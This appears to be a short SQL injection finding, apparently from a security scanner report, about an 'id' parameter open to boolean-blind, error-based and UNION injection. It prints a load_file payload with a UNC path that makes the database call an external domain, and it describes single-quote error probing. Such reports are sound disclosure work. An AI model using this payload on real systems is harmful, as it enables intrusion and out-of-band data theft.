## Description:
The id parameter appears to be vulnerable to three type of SQL injection attacks, boolean-based blind, error-based and UNION query. The payload '+(select load_file('\\\\hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net\\ggc'))+' was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.

Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.
